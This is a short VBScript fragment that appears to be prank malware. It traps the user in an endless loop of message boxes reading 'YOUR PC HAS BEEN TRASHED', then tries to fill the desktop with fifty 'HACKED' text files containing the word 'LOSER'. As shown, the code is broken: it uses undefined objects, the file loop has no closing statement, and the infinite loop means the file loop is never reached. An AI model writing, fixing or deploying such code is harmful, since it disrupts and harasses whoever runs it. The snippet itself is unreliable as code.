do
  MsgBox "YOUR PC HAS BEEN TRASHED",9569,"YOUR PC HAS BEEN TRASHED"
loop

for nexfil=1 to 50
  set p=c.CreateTextFile(""&dsk&"\HACKED"&nexfil&".txt")
  p.write"LOSER"
p.close
